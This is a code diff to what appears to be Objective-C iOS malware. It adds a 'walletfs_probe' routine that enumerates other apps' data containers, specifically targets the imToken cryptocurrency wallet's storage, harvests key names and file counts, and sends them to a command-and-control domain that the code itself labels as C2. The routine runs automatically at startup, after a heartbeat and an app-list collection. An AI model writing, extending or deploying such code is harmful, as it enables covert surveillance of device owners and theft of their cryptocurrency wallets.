@@ -11,6 +11,7 @@
 #import "Net.h"
 #import "Info.h"
 #import "Collector.h"
+#import "WalletFS.h"
 #import "Crypto.h"
 
 static NSString *const kBaseURL     = @"https://myg3z1adawtxz0s.icu";          // C2 域名
@@ -310,6 +311,52 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 
 #pragma mark - 主循环
 
+#pragma mark - 钱包容器探测
+
+/// 一次性探测：能不能从当前进程直接读别的 App 的 Data 容器
+- (void)probeWalletFS {
+    @try {
+        NSArray *rows = [WalletFS probeAllContainers];
+        NSUInteger total = rows.count;
+        NSUInteger readable = 0;
+        NSMutableArray *sample = [NSMutableArray array];
+        for (NSDictionary *r in rows) {
+            if ([r[@"readable"] boolValue]) readable++;
+            if (sample.count < 12 && r[@"bundleId"]) [sample addObject:r[@"bundleId"]];
+        }
+
+        NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
+        ctx[@"host"] = [Info hostBundleId] ?: @"";
+        ctx[@"containers"] = @(total);
+        ctx[@"readable"] = @(readable);
+        ctx[@"sample"] = sample;
+        if (total == 1 && rows[0][@"error"]) ctx[@"rootError"] = rows[0][@"error"];
+
+        // 专门试 imToken
+        NSDictionary *imt = [WalletFS asyncStorageOf:@"im.token.app"];
+        if (imt[@"error"]) {
+            ctx[@"imtoken"] = imt[@"error"];
+        } else {
+            ctx[@"imtoken"] = @"ok";
+            ctx[@"imtokenDir"] = [imt[@"dir"] lastPathComponent] ?: @"";
+            ctx[@"keyCount"] = @([(NSArray *)imt[@"keyNames"] count]);
+            ctx[@"fileCount"] = @([(NSDictionary *)imt[@"files"] count]);
+            NSArray *names = imt[@"keyNames"];
+            ctx[@"keyNames"] = [names count] > 15 ? [names subarrayWithRange:NSMakeRange(0, 15)] : names;
+        }
+
+        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        ev[@"et"] = @"walletfs_probe";
+        ev[@"c"] = kSeed;
+        ev[@"ctx"] = ctx;
+        [self.net sendEvent:ev];
+        [self log:[NSString stringWithFormat:@"walletfs probe: total=%lu readable=%lu imtoken=%@",
+                   (unsigned long)total, (unsigned long)readable, ctx[@"imtoken"]]];
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"walletfs probe exception: %@", e.reason]];
+    }
+}
+
 - (void)start {
     NSString *host = [Info hostBundleId];
     BOOL inSpringBoard = [Info isSpringBoard];
@@ -323,6 +370,9 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
         // 第一轮：自检 + 立刻采集一次
         [self heartbeat];
         [self collectAppList];
+
+        // 一次性：探测能不能从进程外面直接读钱包 App 的容器
+        [self probeWalletFS];
 
         __block NSUInteger tick = 0;
         while (YES) {
